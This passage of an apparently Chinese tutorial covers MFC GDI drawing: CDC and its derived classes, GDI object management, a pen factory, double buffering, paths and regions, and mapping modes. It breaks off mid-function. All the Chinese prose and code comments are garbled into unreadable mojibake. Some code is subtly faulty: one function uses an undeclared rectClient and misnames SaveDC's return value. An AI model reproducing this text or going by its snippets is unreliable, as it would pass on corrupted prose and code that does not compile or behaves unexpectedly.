<p>Windows GDIï¼ˆGraphics Device Interfaceï¼‰æ˜¯Windowsæ“ä½œç³»ç»Ÿçš„å›¾å½¢æ ¸å¿ƒå­ç³»ç»Ÿï¼ŒMFCé€šè¿‡CDCç±»åŠå…¶æ´¾ç”Ÿç±»å¯¹å…¶è¿›è¡Œé¢å‘å¯¹è±¡å°è£…ã€‚ç†è§£GDIçš„å±‚æ¬¡ç»“æ„æ˜¯æŒæ¡MFCç»˜å›¾çš„åŸºç¡€ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c729af5b21c74643a2c392c3667275b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5LqL5ryr6LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765794519&amp;x-signature=65LtXjXR43RYb9XFc%2BGT1dQD%2BXM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-61">äºŒã€è®¾å¤‡ä¸Šä¸‹æ–‡(CDC)çš„æ·±å…¥è§£æ</h3>
<h4 data-id="heading-62">2.1 CDCç±»çš„åŸºæœ¬åŸç†</h4>
<p>è®¾å¤‡ä¸Šä¸‹æ–‡æ˜¯GDIçš„æ ¸å¿ƒæ¦‚å¿µï¼Œå®ƒä»£è¡¨äº†ç»˜å›¾è¡¨é¢çš„æŠ½è±¡ï¼ŒåŒ…å«ç»˜å›¾æ‰€éœ€çš„æ‰€æœ‰çŠ¶æ€ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// CDCç±»çš„å…³é”®å†…éƒ¨ç»“æ„ï¼ˆæ¦‚å¿µæ€§ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CDC</span> : <span class="hljs-keyword">public</span> CObject
{
<span class="hljs-keyword">protected</span>:
    HDC m_hDC;                 <span class="hljs-comment">// Windowsè®¾å¤‡ä¸Šä¸‹æ–‡å¥æŸ„</span>
    HDC m_hAttribDC;           <span class="hljs-comment">// å±æ€§DCï¼ˆç”¨äºæ‰“å°ç­‰ï¼‰</span>
    BOOL m_bPrinting;          <span class="hljs-comment">// æ˜¯å¦ä¸ºæ‰“å°DC</span>
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°</span>
    <span class="hljs-built_in">CDC</span>();
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">CDC</span>();
    
    <span class="hljs-comment">// è®¾å¤‡ä¸Šä¸‹æ–‡æ“ä½œ</span>
    <span class="hljs-function">BOOL <span class="hljs-title">Attach</span><span class="hljs-params">(HDC hDC)</span></span>;      <span class="hljs-comment">// å…³è”ç°æœ‰HDC</span>
    <span class="hljs-function">HDC <span class="hljs-title">Detach</span><span class="hljs-params">()</span></span>;              <span class="hljs-comment">// åˆ†ç¦»HDC</span>
    <span class="hljs-function">HDC <span class="hljs-title">GetSafeHdc</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;    <span class="hljs-comment">// å®‰å…¨è·å–HDC</span>
    
    <span class="hljs-comment">// ç»˜å›¾çŠ¶æ€ç®¡ç†</span>
    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">SaveDC</span><span class="hljs-params">()</span></span>;              <span class="hljs-comment">// ä¿å­˜DCçŠ¶æ€</span>
    <span class="hljs-function">BOOL <span class="hljs-title">RestoreDC</span><span class="hljs-params">(<span class="hljs-type">int</span> nSavedDC)</span></span>; <span class="hljs-comment">// æ¢å¤DCçŠ¶æ€</span>
    
    <span class="hljs-comment">// åæ ‡ä¸æ˜ å°„æ¨¡å¼</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> CPoint <span class="hljs-title">GetViewportOrg</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> CSize <span class="hljs-title">GetViewportExt</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">int</span> <span class="hljs-title">SetMapMode</span><span class="hljs-params">(<span class="hljs-type">int</span> nMapMode)</span></span>;
    
    <span class="hljs-comment">// ç»˜å›¾æ“ä½œ</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> BOOL <span class="hljs-title">LineTo</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> BOOL <span class="hljs-title">Rectangle</span><span class="hljs-params">(<span class="hljs-type">int</span> x1, <span class="hljs-type">int</span> y1, <span class="hljs-type">int</span> x2, <span class="hljs-type">int</span> y2)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> BOOL <span class="hljs-title">Ellipse</span><span class="hljs-params">(<span class="hljs-type">int</span> x1, <span class="hljs-type">int</span> y1, <span class="hljs-type">int</span> x2, <span class="hljs-type">int</span> y2)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> BOOL <span class="hljs-title">TextOut</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y, LPCTSTR lpszString, <span class="hljs-type">int</span> nCount)</span></span>;
    
    <span class="hljs-comment">// GDIå¯¹è±¡ç®¡ç†</span>
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> CGdiObject* <span class="hljs-title">SelectStockObject</span><span class="hljs-params">(<span class="hljs-type">int</span> nIndex)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> CGdiObject* <span class="hljs-title">SelectObject</span><span class="hljs-params">(CGdiObject* pObject)</span></span>;
    
    <span class="hljs-comment">// è®¾å¤‡èƒ½åŠ›æŸ¥è¯¢</span>
    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetDeviceCaps</span><span class="hljs-params">(<span class="hljs-type">int</span> nIndex)</span> <span class="hljs-type">const</span></span>;
    
    <span class="hljs-built_in">DECLARE_DYNAMIC</span>(CDC)
};
</code></pre>
<h4 data-id="heading-63">2.2 ä¸åŒCDCæ´¾ç”Ÿç±»çš„ä½¿ç”¨åœºæ™¯</h4>
<p>MFCæä¾›äº†å¤šç§CDCæ´¾ç”Ÿç±»ä»¥é€‚åº”ä¸åŒç»˜å›¾éœ€æ±‚ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 1. CPaintDC - ç”¨äºWM_PAINTæ¶ˆæ¯å¤„ç†</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::OnPaint</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-function">CPaintDC <span class="hljs-title">dc</span><span class="hljs-params">(<span class="hljs-keyword">this</span>)</span></span>; <span class="hljs-comment">// è‡ªåŠ¨è°ƒç”¨BeginPaint</span>
    
    <span class="hljs-comment">// è·å–æ— æ•ˆåŒºåŸŸ</span>
    CRect rectUpdate;
    dc.<span class="hljs-built_in">GetClipBox</span>(&amp;rectUpdate);
    
    <span class="hljs-comment">// æ‰§è¡Œç»˜å›¾æ“ä½œ</span>
    <span class="hljs-built_in">OnDraw</span>(&amp;dc); <span class="hljs-comment">// é€šå¸¸è°ƒç”¨OnDrawè¿›è¡Œå®é™…ç»˜åˆ¶</span>
    
    <span class="hljs-comment">// ææ„æ—¶è‡ªåŠ¨è°ƒç”¨EndPaint</span>
}

<span class="hljs-comment">// 2. CClientDC - ç”¨äºå®¢æˆ·åŒºå³æ—¶ç»˜å›¾</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::OnMouseMove</span><span class="hljs-params">(UINT nFlags, CPoint point)</span>
</span>{
    <span class="hljs-keyword">if</span> (m_bDrawing)
    {
        <span class="hljs-function">CClientDC <span class="hljs-title">dc</span><span class="hljs-params">(<span class="hljs-keyword">this</span>)</span></span>; <span class="hljs-comment">// è·å–å®¢æˆ·åŒºDC</span>
        
        <span class="hljs-comment">// å®æ—¶ç»˜åˆ¶åé¦ˆ</span>
        dc.<span class="hljs-built_in">MoveTo</span>(m_ptLastPos);
        dc.<span class="hljs-built_in">LineTo</span>(point);
        
        m_ptLastPos = point;
    }
    
    CView::<span class="hljs-built_in">OnMouseMove</span>(nFlags, point);
}

<span class="hljs-comment">// 3. CWindowDC - ç»˜åˆ¶æ•´ä¸ªçª—å£ï¼ˆåŒ…æ‹¬éå®¢æˆ·åŒºï¼‰</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyFrameWnd::OnDrawBorder</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-function">CWindowDC <span class="hljs-title">dc</span><span class="hljs-params">(<span class="hljs-keyword">this</span>)</span></span>; <span class="hljs-comment">// è·å–æ•´ä¸ªçª—å£DC</span>
    
    <span class="hljs-comment">// ç»˜åˆ¶è‡ªå®šä¹‰çª—å£è¾¹æ¡†</span>
    CRect rectWindow;
    <span class="hljs-built_in">GetWindowRect</span>(&amp;rectWindow);
    
    <span class="hljs-comment">// è½¬æ¢ä¸ºå®¢æˆ·åŒºåæ ‡</span>
    <span class="hljs-built_in">ScreenToClient</span>(&amp;rectWindow);
    
    <span class="hljs-comment">// ç»˜åˆ¶è¾¹æ¡†</span>
    <span class="hljs-function">CPen <span class="hljs-title">pen</span><span class="hljs-params">(PS_SOLID, <span class="hljs-number">3</span>, RGB(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))</span></span>;
    dc.<span class="hljs-built_in">SelectObject</span>(&amp;pen);
    dc.<span class="hljs-built_in">SelectStockObject</span>(NULL_BRUSH);
    dc.<span class="hljs-built_in">Rectangle</span>(rectWindow);
}

<span class="hljs-comment">// 4. CMetaFileDC - åˆ›å»ºWindowså›¾å…ƒæ–‡ä»¶</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::CreateMetaFile</span><span class="hljs-params">()</span>
</span>{
    CMetaFileDC dcMeta;
    
    <span class="hljs-comment">// åˆ›å»ºå›¾å…ƒæ–‡ä»¶DC</span>
    <span class="hljs-keyword">if</span> (dcMeta.<span class="hljs-built_in">Create</span>())
    {
        <span class="hljs-comment">// åœ¨å›¾å…ƒæ–‡ä»¶ä¸­è®°å½•ç»˜å›¾å‘½ä»¤</span>
        dcMeta.<span class="hljs-built_in">SetMapMode</span>(MM_ANISOTROPIC);
        dcMeta.<span class="hljs-built_in">SetWindowExt</span>(<span class="hljs-number">1000</span>, <span class="hljs-number">1000</span>);
        dcMeta.<span class="hljs-built_in">SetViewportExt</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>);
        
        <span class="hljs-comment">// è®°å½•ç»˜å›¾æ“ä½œ</span>
        dcMeta.<span class="hljs-built_in">Rectangle</span>(<span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">500</span>, <span class="hljs-number">500</span>);
        dcMeta.<span class="hljs-built_in">Ellipse</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">400</span>, <span class="hljs-number">400</span>);
        
        <span class="hljs-comment">// å…³é—­å›¾å…ƒæ–‡ä»¶</span>
        HMETAFILE hMetaFile = dcMeta.<span class="hljs-built_in">Close</span>();
        
        <span class="hljs-keyword">if</span> (hMetaFile != <span class="hljs-literal">NULL</span>)
        {
            <span class="hljs-comment">// å¯ä»¥ä¿å­˜æˆ–å›æ”¾å›¾å…ƒæ–‡ä»¶</span>
            <span class="hljs-function">CClientDC <span class="hljs-title">dc</span><span class="hljs-params">(<span class="hljs-keyword">this</span>)</span></span>;
            dc.<span class="hljs-built_in">PlayMetaFile</span>(hMetaFile);
            
            <span class="hljs-comment">// åˆ é™¤å›¾å…ƒæ–‡ä»¶å¥æŸ„</span>
            ::<span class="hljs-built_in">DeleteMetaFile</span>(hMetaFile);
        }
    }
}
</code></pre>
<h3 data-id="heading-64">ä¸‰ã€GDIå¯¹è±¡ç®¡ç†ä¸èµ„æºç”Ÿå‘½å‘¨æœŸ</h3>
<h4 data-id="heading-65">3.1 GDIå¯¹è±¡çš„åŸºæœ¬ä½¿ç”¨æ¨¡å¼</h4>
<p>æ­£ç¡®çš„GDIå¯¹è±¡ç®¡ç†æ˜¯é˜²æ­¢èµ„æºæ³„æ¼çš„å…³é”®ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::OnDraw</span><span class="hljs-params">(CDC* pDC)</span>
</span>{
    <span class="hljs-comment">// 1. åˆ›å»ºGDIå¯¹è±¡</span>
    <span class="hljs-function">CPen <span class="hljs-title">newPen</span><span class="hljs-params">(PS_SOLID, <span class="hljs-number">2</span>, RGB(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>))</span></span>;
    <span class="hljs-function">CBrush <span class="hljs-title">newBrush</span><span class="hljs-params">(RGB(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>))</span></span>;
    CFont newFont;
    
    <span class="hljs-comment">// åˆ›å»ºå­—ä½“</span>
    LOGFONT lf = {<span class="hljs-number">0</span>};
    lf.lfHeight = <span class="hljs-number">-16</span>;
    lf.lfWeight = FW_BOLD;
    <span class="hljs-built_in">lstrcpy</span>(lf.lfFaceName, _T(<span class="hljs-string">"Arial"</span>));
    newFont.<span class="hljs-built_in">CreateFontIndirect</span>(&amp;lf);
    
    <span class="hljs-comment">// 2. ä¿å­˜æ—§å¯¹è±¡å¹¶é€‰å…¥æ–°å¯¹è±¡</span>
    CPen* pOldPen = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;newPen);
    CBrush* pOldBrush = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;newBrush);
    CFont* pOldFont = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;newFont);
    
    <span class="hljs-comment">// 3. æ‰§è¡Œç»˜å›¾æ“ä½œ</span>
    pDC-&gt;<span class="hljs-built_in">Rectangle</span>(<span class="hljs-number">10</span>, <span class="hljs-number">10</span>, <span class="hljs-number">200</span>, <span class="hljs-number">150</span>);
    pDC-&gt;<span class="hljs-built_in">Ellipse</span>(<span class="hljs-number">50</span>, <span class="hljs-number">50</span>, <span class="hljs-number">150</span>, <span class="hljs-number">100</span>);
    pDC-&gt;<span class="hljs-built_in">TextOut</span>(<span class="hljs-number">20</span>, <span class="hljs-number">20</span>, _T(<span class="hljs-string">"GDIç»˜å›¾ç¤ºä¾‹"</span>));
    
    <span class="hljs-comment">// 4. æ¢å¤æ—§å¯¹è±¡ï¼ˆæŒ‰ç›¸åé¡ºåºï¼‰</span>
    pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldFont);
    pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldBrush);
    pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldPen);
    
    <span class="hljs-comment">// 5. GDIå¯¹è±¡åœ¨ä½œç”¨åŸŸç»“æŸæ—¶è‡ªåŠ¨åˆ é™¤</span>
    <span class="hljs-comment">//    æ³¨æ„ï¼šå¦‚æœè°ƒç”¨DeleteObjectï¼Œéœ€ç¡®ä¿ä¸å†ä½¿ç”¨è¯¥å¯¹è±¡</span>
}
</code></pre>
<h4 data-id="heading-66">3.2 GDIå¯¹è±¡çš„åˆ›å»ºå·¥å‚æ¨¡å¼</h4>
<p>å¯¹äºéœ€è¦é¢‘ç¹åˆ›å»ºç›¸åŒæ ·å¼GDIå¯¹è±¡çš„æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨å·¥å‚æ¨¡å¼ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CGdiObjectFactory</span>
{
<span class="hljs-keyword">private</span>:
    <span class="hljs-type">static</span> CMap&lt;DWORD, DWORD, CPen*, CPen*&gt; m_mapPens;
    <span class="hljs-type">static</span> CMap&lt;DWORD, DWORD, CBrush*, CBrush*&gt; m_mapBrushes;
    <span class="hljs-type">static</span> CCriticalSection m_cs; <span class="hljs-comment">// çº¿ç¨‹ä¿æŠ¤</span>
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// è·å–æˆ–åˆ›å»ºæŒ‡å®šæ ·å¼çš„ç”»ç¬”</span>
    <span class="hljs-function"><span class="hljs-type">static</span> CPen* <span class="hljs-title">GetPen</span><span class="hljs-params">(<span class="hljs-type">int</span> nStyle, <span class="hljs-type">int</span> nWidth, COLORREF crColor)</span>
    </span>{
        <span class="hljs-function">CSingleLock <span class="hljs-title">lock</span><span class="hljs-params">(&amp;m_cs, TRUE)</span></span>;
        
        <span class="hljs-comment">// åˆ›å»ºå”¯ä¸€é”®</span>
        DWORD dwKey = (nStyle &lt;&lt; <span class="hljs-number">24</span>) | (nWidth &lt;&lt; <span class="hljs-number">16</span>) | crColor;
        
        CPen* pPen = <span class="hljs-literal">NULL</span>;
        <span class="hljs-keyword">if</span> (!m_mapPens.<span class="hljs-built_in">Lookup</span>(dwKey, pPen))
        {
            <span class="hljs-comment">// åˆ›å»ºæ–°ç”»ç¬”</span>
            pPen = <span class="hljs-keyword">new</span> <span class="hljs-built_in">CPen</span>(nStyle, nWidth, crColor);
            m_mapPens.<span class="hljs-built_in">SetAt</span>(dwKey, pPen);
        }
        
        <span class="hljs-keyword">return</span> pPen;
    }
    
    <span class="hljs-comment">// æ¸…ç†æ‰€æœ‰GDIå¯¹è±¡</span>
    <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">Cleanup</span><span class="hljs-params">()</span>
    </span>{
        <span class="hljs-function">CSingleLock <span class="hljs-title">lock</span><span class="hljs-params">(&amp;m_cs, TRUE)</span></span>;
        
        <span class="hljs-comment">// åˆ é™¤æ‰€æœ‰ç”»ç¬”</span>
        POSITION pos = m_mapPens.<span class="hljs-built_in">GetStartPosition</span>();
        DWORD dwKey;
        CPen* pPen;
        <span class="hljs-keyword">while</span> (pos != <span class="hljs-literal">NULL</span>)
        {
            m_mapPens.<span class="hljs-built_in">GetNextAssoc</span>(pos, dwKey, pPen);
            <span class="hljs-keyword">delete</span> pPen;
        }
        m_mapPens.<span class="hljs-built_in">RemoveAll</span>();
        
        <span class="hljs-comment">// ç±»ä¼¼åœ°æ¸…ç†ç”»åˆ·ç­‰</span>
    }
};
</code></pre>
<h3 data-id="heading-67">å››ã€é«˜çº§ç»˜å›¾æŠ€æœ¯ä¸ä¼˜åŒ–</h3>
<h4 data-id="heading-68">4.1 åŒç¼“å†²ç»˜å›¾æŠ€æœ¯</h4>
<p>åŒç¼“å†²æ˜¯æ¶ˆé™¤ç»˜å›¾é—ªçƒçš„å…³é”®æŠ€æœ¯ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CDoubleBufferDC</span> : <span class="hljs-keyword">public</span> CDC
{
<span class="hljs-keyword">private</span>:
    CDC* m_pDC;            <span class="hljs-comment">// åŸå§‹è®¾å¤‡ä¸Šä¸‹æ–‡</span>
    CBitmap m_bitmap;      <span class="hljs-comment">// å†…å­˜ä½å›¾</span>
    CBitmap* m_pOldBitmap; <span class="hljs-comment">// æ—§ä½å›¾</span>
    CRect m_rect;          <span class="hljs-comment">// ç»˜åˆ¶åŒºåŸŸ</span>
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">CDoubleBufferDC</span>(CDC* pDC, <span class="hljs-type">const</span> CRect&amp; rect)
        : <span class="hljs-built_in">m_pDC</span>(pDC), <span class="hljs-built_in">m_rect</span>(rect)
    {
        <span class="hljs-comment">// åˆ›å»ºå…¼å®¹çš„å†…å­˜DC</span>
        <span class="hljs-built_in">CreateCompatibleDC</span>(pDC);
        
        <span class="hljs-comment">// åˆ›å»ºå…¼å®¹ä½å›¾</span>
        m_bitmap.<span class="hljs-built_in">CreateCompatibleBitmap</span>(pDC, rect.<span class="hljs-built_in">Width</span>(), rect.<span class="hljs-built_in">Height</span>());
        
        <span class="hljs-comment">// é€‰å…¥ä½å›¾</span>
        m_pOldBitmap = <span class="hljs-built_in">SelectObject</span>(&amp;m_bitmap);
        
        <span class="hljs-comment">// è®¾ç½®åŸç‚¹åç§»</span>
        <span class="hljs-built_in">SetViewportOrg</span>(-rect.left, -rect.top);
    }
    
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">CDoubleBufferDC</span>()
    {
        <span class="hljs-comment">// å°†å†…å­˜ä½å›¾æ‹·è´åˆ°å±å¹•</span>
        m_pDC-&gt;<span class="hljs-built_in">BitBlt</span>(m_rect.left, m_rect.top, 
                     m_rect.<span class="hljs-built_in">Width</span>(), m_rect.<span class="hljs-built_in">Height</span>(),
                     <span class="hljs-keyword">this</span>, 
                     m_rect.left, m_rect.top, 
                     SRCCOPY);
        
        <span class="hljs-comment">// æ¢å¤åŸå§‹ä½å›¾</span>
        <span class="hljs-built_in">SelectObject</span>(m_pOldBitmap);
        
        <span class="hljs-comment">// ä½å›¾å¯¹è±¡è‡ªåŠ¨åˆ é™¤</span>
    }
};

<span class="hljs-comment">// åœ¨è§†å›¾ç±»ä¸­ä½¿ç”¨åŒç¼“å†²</span>
<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::OnDraw</span><span class="hljs-params">(CDC* pDC)</span>
</span>{
    CRect rectClient;
    <span class="hljs-built_in">GetClientRect</span>(&amp;rectClient);
    
    <span class="hljs-comment">// åˆ›å»ºåŒç¼“å†²DC</span>
    <span class="hljs-function">CDoubleBufferDC <span class="hljs-title">dbDC</span><span class="hljs-params">(pDC, rectClient)</span></span>;
    
    <span class="hljs-comment">// ä½¿ç”¨dbDCè¿›è¡Œæ‰€æœ‰ç»˜å›¾æ“ä½œ</span>
    <span class="hljs-built_in">DrawBackground</span>(&amp;dbDC, rectClient);
    <span class="hljs-built_in">DrawContent</span>(&amp;dbDC, rectClient);
    <span class="hljs-built_in">DrawOverlay</span>(&amp;dbDC, rectClient);
    
    <span class="hljs-comment">// dbDCææ„æ—¶è‡ªåŠ¨åˆ·æ–°åˆ°å±å¹•</span>
}
</code></pre>
<h4 data-id="heading-69">4.2 è·¯å¾„ä¸å¤æ‚åŒºåŸŸæ“ä½œ</h4>
<p>è·¯å¾„æä¾›äº†ä¸€ç§è®°å½•å’Œé‡ç”¨å¤æ‚ç»˜å›¾åºåˆ—çš„æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::DrawComplexShape</span><span class="hljs-params">(CDC* pDC)</span>
</span>{
    <span class="hljs-comment">// å¼€å§‹è·¯å¾„å®šä¹‰</span>
    pDC-&gt;<span class="hljs-built_in">BeginPath</span>();
    
    <span class="hljs-comment">// å®šä¹‰è·¯å¾„å½¢çŠ¶</span>
    pDC-&gt;<span class="hljs-built_in">MoveTo</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>);
    pDC-&gt;<span class="hljs-built_in">LineTo</span>(<span class="hljs-number">200</span>, <span class="hljs-number">100</span>);
    pDC-&gt;<span class="hljs-built_in">LineTo</span>(<span class="hljs-number">200</span>, <span class="hljs-number">200</span>);
    pDC-&gt;<span class="hljs-built_in">LineTo</span>(<span class="hljs-number">100</span>, <span class="hljs-number">200</span>);
    pDC-&gt;<span class="hljs-built_in">LineTo</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>); <span class="hljs-comment">// é—­åˆçŸ©å½¢</span>
    
    <span class="hljs-comment">// æ·»åŠ ç¬¬äºŒä¸ªå½¢çŠ¶</span>
    pDC-&gt;<span class="hljs-built_in">MoveTo</span>(<span class="hljs-number">150</span>, <span class="hljs-number">50</span>);
    pDC-&gt;<span class="hljs-built_in">LineTo</span>(<span class="hljs-number">250</span>, <span class="hljs-number">150</span>);
    pDC-&gt;<span class="hljs-built_in">LineTo</span>(<span class="hljs-number">50</span>, <span class="hljs-number">150</span>);
    pDC-&gt;<span class="hljs-built_in">CloseFigure</span>(); <span class="hljs-comment">// é—­åˆä¸‰è§’å½¢</span>
    
    <span class="hljs-comment">// ç»“æŸè·¯å¾„å®šä¹‰</span>
    pDC-&gt;<span class="hljs-built_in">EndPath</span>();
    
    <span class="hljs-comment">// 1. ç»˜åˆ¶è·¯å¾„è½®å»“</span>
    <span class="hljs-function">CPen <span class="hljs-title">pen</span><span class="hljs-params">(PS_SOLID, <span class="hljs-number">2</span>, RGB(<span class="hljs-number">255</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))</span></span>;
    CPen* pOldPen = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;pen);
    pDC-&gt;<span class="hljs-built_in">StrokePath</span>();
    pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldPen);
    
    <span class="hljs-comment">// 2. å¡«å……è·¯å¾„</span>
    <span class="hljs-function">CBrush <span class="hljs-title">brush</span><span class="hljs-params">(RGB(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0</span>))</span></span>;
    CBrush* pOldBrush = pDC-&gt;<span class="hljs-built_in">SelectObject</span>(&amp;brush);
    pDC-&gt;<span class="hljs-built_in">FillPath</span>();
    pDC-&gt;<span class="hljs-built_in">SelectObject</span>(pOldBrush);
    
    <span class="hljs-comment">// 3. å°†è·¯å¾„è½¬æ¢ä¸ºåŒºåŸŸ</span>
    CRgn region;
    <span class="hljs-keyword">if</span> (region.<span class="hljs-built_in">CreateFromPath</span>(pDC))
    {
        <span class="hljs-comment">// ä½¿ç”¨åŒºåŸŸè¿›è¡Œç‚¹å‡»æµ‹è¯•</span>
        <span class="hljs-function">CPoint <span class="hljs-title">ptTest</span><span class="hljs-params">(<span class="hljs-number">120</span>, <span class="hljs-number">120</span>)</span></span>;
        <span class="hljs-keyword">if</span> (region.<span class="hljs-built_in">PtInRegion</span>(ptTest))
        {
            pDC-&gt;<span class="hljs-built_in">TextOut</span>(<span class="hljs-number">10</span>, <span class="hljs-number">10</span>, _T(<span class="hljs-string">"ç‚¹åœ¨åŒºåŸŸå†…"</span>));
        }
        
        <span class="hljs-comment">// åŒºåŸŸä¹Ÿå¯ä»¥ç”¨äºè£å‰ª</span>
        pDC-&gt;<span class="hljs-built_in">SelectClipRgn</span>(&amp;region);
        <span class="hljs-comment">// ... åœ¨è£å‰ªåŒºåŸŸå†…ç»˜å›¾</span>
        pDC-&gt;<span class="hljs-built_in">SelectClipRgn</span>(<span class="hljs-literal">NULL</span>); <span class="hljs-comment">// å–æ¶ˆè£å‰ª</span>
    }
}
</code></pre>
<h4 data-id="heading-70">4.3 åæ ‡ç³»ç»Ÿä¸å˜æ¢</h4>
<p>MFCæ”¯æŒå¤šç§åæ ‡æ˜ å°„æ¨¡å¼å’Œå˜æ¢ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CMyView::DemonstrateCoordinateSystems</span><span class="hljs-params">(CDC* pDC)</span>
</span>{
    <span class="hljs-comment">// ä¿å­˜åŸå§‹DCçŠ¶æ€</span>
    <span class="hljs-type">int</span> nOldMapMode = pDC-&gt;<span class="hljs-built_in">SaveDC</span>();
    
    <span class="hljs-comment">// ç¤ºä¾‹1ï¼šé€»è¾‘åæ ‡ä¸è®¾å¤‡åæ ‡</span>
    pDC-&gt;<span class="hljs-built_in">SetMapMode</span>(MM_TEXT); <span class="hljs-comment">// é»˜è®¤æ¨¡å¼ï¼Œ1é€»è¾‘å•ä½=1åƒç´ </span>
    
    <span class="hljs-comment">// è®¾ç½®çª—å£ï¼ˆé€»è¾‘ï¼‰å’Œè§†å£ï¼ˆè®¾å¤‡ï¼‰èŒƒå›´</span>
    pDC-&gt;<span class="hljs-built_in">SetWindowExt</span>(<span class="hljs-number">1000</span>, <span class="hljs-number">1000</span>);  <span class="hljs-comment">// é€»è¾‘èŒƒå›´</span>
    pDC-&gt;<span class="hljs-built_in">SetViewportExt</span>(<span class="hljs-number">500</span>, <span class="hljs-number">500</span>);  <span class="hljs-comment">// è®¾å¤‡èŒƒå›´</span>
    
    <span class="hljs-comment">// ç¤ºä¾‹2ï¼šä½¿ç”¨MM_ANISOTROPICæ¨¡å¼</span>
    pDC-&gt;<span class="hljs-built_in">SetMapMode</span>(MM_ANISOTROPIC);
    pDC-&gt;<span class="hljs-built_in">SetWindowExt</span>(<span class="hljs-number">1000</span>, <span class="hljs-number">1000</span>);
    pDC-&gt;<span class="hljs-built_in">SetViewportExt</span>(rectClient.<span class="hljs-built_in">Width</span>(), rectClient.<span class="hljs-built_in">Height</span>());
    
    <span class="hljs-comment">// ç»˜åˆ¶éšçª—å£å¤§å°ç¼©æ”¾çš„å›¾å½¢</span>
    pDC-&gt;<span class="hljs-built_in">Rectangle</span>(<span class="hljs-number">100</span>, <span class="hljs-number">100</span>, <span class="hljs-number">900</span>, <span class="hljs-number">900</span>);
    
    <span class="hljs-comment">// ç¤ºä¾‹3ï¼šä½¿ç”¨MM_HIMETRICæ¨¡å¼ï¼ˆç‰©ç†å°ºå¯¸ï¼‰</span>
    pDC-&gt;<span class="hljs-built_in">SetMapMode</span>(MM_HIMETRIC); <span class="hljs-comment">// 0.01æ¯«ç±³å•ä½</span>
    pDC-&gt;<span class="hljs-built_in">Rectangle</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10000</span>, <span class="hljs-number">-5000</span>); <span class="hljs-comment">// 10cm x 5cmçŸ©å½¢</span>
    
    <span class="hljs-comment">// åæ ‡è½¬æ¢ç¤ºä¾‹</span>
